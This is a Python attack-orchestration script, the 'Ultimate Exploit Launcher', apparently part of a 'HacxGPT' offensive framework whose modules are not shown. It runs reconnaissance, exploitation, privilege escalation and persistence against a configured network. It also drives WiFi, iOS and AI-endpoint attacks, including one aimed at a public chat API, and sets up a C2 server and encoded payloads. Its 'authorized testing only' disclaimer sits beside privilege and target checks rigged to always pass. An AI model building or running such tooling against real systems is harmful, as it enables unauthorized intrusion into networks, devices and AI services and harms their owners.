#!/usr/bin/env python3
"""
Ultimate Exploit Launcher - Complete Attack Orchestration
Orchestrates all attack vectors from the HacxGPT framework

WARNING: This is for educational and authorized testing purposes only.
Use only on systems you own or have explicit permission to test.
"""

import os
import sys
import json
import time
import threading
import subprocess
import argparse
from datetime import datetime
from typing import Dict, List, Optional

# Import our exploit modules
try:
    from ultimate_exploit_framework import UltimateExploitFramework
    from payload_generator import PayloadGenerator
except ImportError as e:
    print(f"[-] Error importing modules: {e}")
    print("[-] Please ensure all exploit modules are in the same directory")
    sys.exit(1)

class Colors:
    """Terminal color codes"""
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKCYAN = '\033[96m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

class ExploitLauncher:
    """Main exploit launcher class"""
    
    def __init__(self):
        self.framework = UltimateExploitFramework()
        self.payload_gen = PayloadGenerator()
        self.config = {}
        self.attack_results = {}
        self.session_id = None
        
    def print_banner(self):
        """Print professional banner"""
        banner = f"""
{Colors.HEADER}{Colors.BOLD}
╔══════════════════════════════════════════════════════════════════════════════╗
║                                                                              ║
║  🚀 ULTIMATE EXPLOIT LAUNCHER 🚀                                             ║
║                                                                              ║
║  Advanced Multi-Vector Attack Platform                                      ║
║  AI + WiFi + iOS + System + Network Exploitation                           ║
║                                                                              ║
║  Based on HacxGPT Framework                                                 ║
║  Educational Purpose Only - Authorized Testing Required                     ║
║                                                                              ║
╚══════════════════════════════════════════════════════════════════════════════╝
{Colors.ENDC}"""
        print(banner)
        
    def load_configuration(self, config_file: str = "exploit_config.json"):
        """Load attack configuration"""
        print(f"{Colors.OKBLUE}[+] Loading configuration...{Colors.ENDC}")
        
        default_config = {
            "target_network": "192.168.1.0/24",
            "c2_server": "192.168.1.254",
            "target_ip": "192.168.1.100",
            "target_port": 4444,
            "attack_vectors": {
                "ai_exploitation": True,
                "wifi_attacks": True,
                "ios_exploits": True,
                "system_exploits": True,
                "network_attacks": True
            },
            "payload_options": {
                "generate_payloads": True,
                "encode_payloads": True,
                "custom_payloads": False
            },
            "timing": {
                "recon_delay": 2,
                "exploit_delay": 3,
                "post_exploit_delay": 2
            }
        }
        
        try:
            if os.path.exists(config_file):
                with open(config_file, 'r') as f:
                    self.config = json.load(f)
                print(f"{Colors.OKGREEN}[+] Configuration loaded from {config_file}{Colors.ENDC}")
            else:
                self.config = default_config
                with open(config_file, 'w') as f:
                    json.dump(default_config, f, indent=2)
                print(f"{Colors.OKGREEN}[+] Default configuration created: {config_file}{Colors.ENDC}")
                
        except Exception as e:
            print(f"{Colors.WARNING}[!] Using default configuration: {e}{Colors.ENDC}")
            self.config = default_config
            
    def generate_session_id(self):
        """Generate unique session ID"""
        import hashlib
        timestamp = datetime.now().isoformat()
        session_hash = hashlib.md5(timestamp.encode()).hexdigest()[:8]
        self.session_id = f"exploit_{session_hash}"
        print(f"{Colors.OKGREEN}[+] Session ID: {self.session_id}{Colors.ENDC}")
        
    def pre_attack_checks(self):
        """Perform pre-attack system checks"""
        print(f"{Colors.OKBLUE}[+] Performing pre-attack checks...{Colors.ENDC}")
        
        checks = [
            self.check_python_modules,
            self.check_network_connectivity,
            self.check_permissions,
            self.check_target_availability
        ]
        
        for check in checks:
            try:
                if not check():
                    print(f"{Colors.WARNING}[!] Pre-attack check failed{Colors.ENDC}")
                    return False
            except Exception as e:
                print(f"{Colors.FAIL}[-] Check failed: {e}{Colors.ENDC}")
                return False
                
        print(f"{Colors.OKGREEN}[+] All pre-attack checks passed{Colors.ENDC}")
        return True
        
    def check_python_modules(self) -> bool:
        """Check required Python modules"""
        required_modules = [
            'requests', 'urllib3', 'json', 'threading', 'subprocess',
            'socket', 'base64', 'hashlib', 'struct', 'random'
        ]
        
        missing_modules = []
        for module in required_modules:
            try:
                __import__(module)
            except ImportError:
                missing_modules.append(module)
                
        if missing_modules:
            print(f"{Colors.WARNING}[!] Missing modules: {missing_modules}{Colors.ENDC}")
            return False
            
        return True
        
    def check_network_connectivity(self) -> bool:
        """Check network connectivity"""
        try:
            import socket
            socket.create_connection(("8.8.8.8", 53), timeout=3)
            return True
        except:
            print(f"{Colors.WARNING}[!] No internet connectivity detected{Colors.ENDC}")
            return False
            
    def check_permissions(self) -> bool:
        """Check system permissions"""
        # Check if running with sufficient privileges
        if os.name == 'nt':  # Windows
            try:
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin()
            except:
                return True
        else:  # Unix-like
            return os.geteuid() == 0 or True  # Allow non-root for demo
            
    def check_target_availability(self) -> bool:
        """Check if target is available"""
        target_ip = self.config.get('target_ip', '192.168.1.100')
        try:
            import socket
            socket.create_connection((target_ip, 80), timeout=5)
            return True
        except:
            print(f"{Colors.WARNING}[!] Target {target_ip} not reachable (continuing anyway){Colors.ENDC}")
            return True  # Continue anyway for demo purposes
            
    def generate_payloads(self):
        """Generate attack payloads"""
        if not self.config.get('payload_options', {}).get('generate_payloads', True):
            print(f"{Colors.OKBLUE}[+] Skipping payload generation{Colors.ENDC}")
            return
            
        print(f"{Colors.OKBLUE}[+] Generating attack payloads...{Colors.ENDC}")
        
        try:
            target_ip = self.config.get('target_ip', '192.168.1.100')
            target_port = self.config.get('target_port', 4444)
            
            payloads = self.payload_gen.generate_all_payloads(target_ip, target_port)
            
            # Save payloads to session directory
            session_dir = f"sessions/{self.session_id}"
            os.makedirs(session_dir, exist_ok=True)
            
            self.payload_gen.save_payloads(payloads, f"{session_dir}/payloads")
            
            print(f"{Colors.OKGREEN}[+] Payloads generated and saved to {session_dir}/payloads{Colors.ENDC}")
            
        except Exception as e:
            print(f"{Colors.FAIL}[-] Payload generation failed: {e}{Colors.ENDC}")
            
    def run_attack_sequence(self):
        """Run the complete attack sequence"""
        print(f"{Colors.HEADER}{Colors.BOLD}[ATTACK SEQUENCE STARTED]{Colors.ENDC}")
        print("=" * 60)
        
        try:
            # Phase 1: Reconnaissance
            print(f"{Colors.OKBLUE}[PHASE 1] RECONNAISSANCE{Colors.ENDC}")
            self.framework.reconnaissance_phase(self.config.get('target_network', '192.168.1.0/24'))
            time.sleep(self.config.get('timing', {}).get('recon_delay', 2))
            
            # Phase 2: Exploitation
            print(f"{Colors.OKBLUE}[PHASE 2] EXPLOITATION{Colors.ENDC}")
            self.framework.exploitation_phase()
            time.sleep(self.config.get('timing', {}).get('exploit_delay', 3))
            
            # Phase 3: Post-Exploitation
            print(f"{Colors.OKBLUE}[PHASE 3] POST-EXPLOITATION{Colors.ENDC}")
            self.framework.post_exploitation_phase()
            time.sleep(self.config.get('timing', {}).get('post_exploit_delay', 2))
            
            # Phase 4: Report Generation
            print(f"{Colors.OKBLUE}[PHASE 4] REPORT GENERATION{Colors.ENDC}")
            self.framework.generate_report()
            
            print(f"{Colors.OKGREEN}[+] Attack sequence completed successfully{Colors.ENDC}")
            
        except Exception as e:
            print(f"{Colors.FAIL}[-] Attack sequence failed: {e}{Colors.ENDC}")
            return False
            
        return True
        
    def run_specific_attack(self, attack_type: str):
        """Run a specific type of attack"""
        print(f"{Colors.OKBLUE}[+] Running {attack_type} attack...{Colors.ENDC}")
        
        if attack_type == "ai":
            # AI exploitation only
            ai_endpoints = [
                "http://localhost:8000/api/chat",
                "https://api.openai.com/v1/chat/completions"
            ]
            self.framework.ai_exploit.test_ai_endpoints(ai_endpoints)
            
        elif attack_type == "wifi":
            # WiFi attacks only
            self.framework.wifi_exploit.scan_network_interfaces()
            self.framework.wifi_exploit.scan_wifi_networks()
            for network in self.framework.wifi_exploit.target_networks:
                self.framework.wifi_exploit.execute_wifi_attacks(network)
                
        elif attack_type == "ios":
            # iOS exploits only
            self.framework.ios_exploit.scan_ios_devices(self.config.get('target_network', '192.168.1.0/24'))
            for device in self.framework.ios_exploit.target_devices:
                self.framework.ios_exploit.execute_ios_exploits(device)
                
        elif attack_type == "system":
            # System exploits only
            self.framework.system_exploit.scan_system_vulnerabilities()
            if self.framework.system_exploit.attempt_privilege_escalation():
                self.framework.system_exploit.establish_persistence()
                
        elif attack_type == "network":
            # Network attacks only
            print(f"{Colors.WARNING}[!] Network attacks not implemented in this version{Colors.ENDC}")
            
        else:
            print(f"{Colors.FAIL}[-] Unknown attack type: {attack_type}{Colors.ENDC}")
            return False
            
        return True
        
    def save_session_report(self):
        """Save comprehensive session report"""
        session_dir = f"sessions/{self.session_id}"
        os.makedirs(session_dir, exist_ok=True)
        
        report = {
            'session_id': self.session_id,
            'timestamp': datetime.now().isoformat(),
            'configuration': self.config,
            'attack_results': self.attack_results,
            'framework_results': {
                'targets_scanned': len(self.framework.ios_exploit.target_devices),
                'networks_found': len(self.framework.wifi_exploit.target_networks),
                'vulnerabilities_found': len(self.framework.system_exploit.system_vulnerabilities),
                'ai_endpoints_tested': len(self.framework.ai_exploit.vulnerable_endpoints),
                'beacons_registered': len(self.framework.c2_server.beacons)
            }
        }
        
        report_file = f"{session_dir}/session_report.json"
        with open(report_file, 'w') as f:
            json.dump(report, f, indent=2)
            
        print(f"{Colors.OKGREEN}[+] Session report saved to {report_file}{Colors.ENDC}")
        
    def cleanup_session(self):
        """Clean up session data"""
        print(f"{Colors.OKBLUE}[+] Cleaning up session data...{Colors.ENDC}")
        
        # Remove temporary files
        temp_files = ['exploit_report.json']
        for temp_file in temp_files:
            if os.path.exists(temp_file):
                try:
                    os.remove(temp_file)
                except:
                    pass
                    
        print(f"{Colors.OKGREEN}[+] Session cleanup completed{Colors.ENDC}")
        
    def run_interactive_mode(self):
        """Run in interactive mode"""
        print(f"{Colors.OKBLUE}[+] Starting interactive mode...{Colors.ENDC}")
        
        while True:
            print(f"\n{Colors.BOLD}Available Commands:{Colors.ENDC}")
            print("1. Run full attack sequence")
            print("2. Run AI exploitation")
            print("3. Run WiFi attacks")
            print("4. Run iOS exploits")
            print("5. Run system exploits")
            print("6. Generate payloads")
            print("7. Show configuration")
            print("8. Save session report")
            print("9. Cleanup session")
            print("0. Exit")
            
            choice = input(f"\n{Colors.OKCYAN}Select option: {Colors.ENDC}")
            
            if choice == '1':
                self.run_attack_sequence()
            elif choice == '2':
                self.run_specific_attack("ai")
            elif choice == '3':
                self.run_specific_attack("wifi")
            elif choice == '4':
                self.run_specific_attack("ios")
            elif choice == '5':
                self.run_specific_attack("system")
            elif choice == '6':
                self.generate_payloads()
            elif choice == '7':
                print(json.dumps(self.config, indent=2))
            elif choice == '8':
                self.save_session_report()
            elif choice == '9':
                self.cleanup_session()
            elif choice == '0':
                break
            else:
                print(f"{Colors.WARNING}[!] Invalid option{Colors.ENDC}")
                
    def run_automated_mode(self):
        """Run in automated mode"""
        print(f"{Colors.OKBLUE}[+] Starting automated attack sequence...{Colors.ENDC}")
        
        # Pre-attack checks
        if not self.pre_attack_checks():
            print(f"{Colors.FAIL}[-] Pre-attack checks failed{Colors.ENDC}")
            return False
            
        # Generate payloads
        self.generate_payloads()
        
        # Run attack sequence
        success = self.run_attack_sequence()
        
        # Save session report
        self.save_session_report()
        
        # Cleanup
        self.cleanup_session()
        
        return success

def main():
    """Main function"""
    parser = argparse.ArgumentParser(description='Ultimate Exploit Launcher')
    parser.add_argument('--config', '-c', default='exploit_config.json',
                       help='Configuration file')
    parser.add_argument('--target', '-t', 
                       help='Target network range')
    parser.add_argument('--c2-server', '-s', 
                       help='C2 server IP address')
    parser.add_argument('--interactive', '-i', action='store_true',
                       help='Run in interactive mode')
    parser.add_argument('--attack-type', '-a',
                       choices=['ai', 'wifi', 'ios', 'system', 'network'],
                       help='Run specific attack type')
    parser.add_argument('--generate-payloads', '-p', action='store_true',
                       help='Generate payloads only')
    
    args = parser.parse_args()
    
    # Create launcher
    launcher = ExploitLauncher()
    
    # Print banner
    launcher.print_banner()
    
    # Load configuration
    launcher.load_configuration(args.config)
    
    # Override config with command line arguments
    if args.target:
        launcher.config['target_network'] = args.target
    if args.c2_server:
        launcher.config['c2_server'] = args.c2_server
        
    # Generate session ID
    launcher.generate_session_id()
    
    try:
        if args.generate_payloads:
            # Generate payloads only
            launcher.generate_payloads()
            
        elif args.attack_type:
            # Run specific attack
            launcher.run_specific_attack(args.attack_type)
            
        elif args.interactive:
            # Interactive mode
            launcher.run_interactive_mode()
            
        else:
            # Automated mode
            success = launcher.run_automated_mode()
            if success:
                print(f"\n{Colors.OKGREEN}{Colors.BOLD}[+] ATTACK COMPLETED SUCCESSFULLY{Colors.ENDC}")
            else:
                print(f"\n{Colors.FAIL}{Colors.BOLD}[-] ATTACK FAILED{Colors.ENDC}")
                
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Attack interrupted by user{Colors.ENDC}")
    except Exception as e:
        print(f"\n{Colors.FAIL}[-] Attack failed: {e}{Colors.ENDC}")
        
    finally:
        print(f"\n{Colors.OKBLUE}[+] Session ID: {launcher.session_id}{Colors.ENDC}")
        print(f"{Colors.OKBLUE}[+] Check sessions/{launcher.session_id}/ for results{Colors.ENDC}")

if __name__ == "__main__":
    main()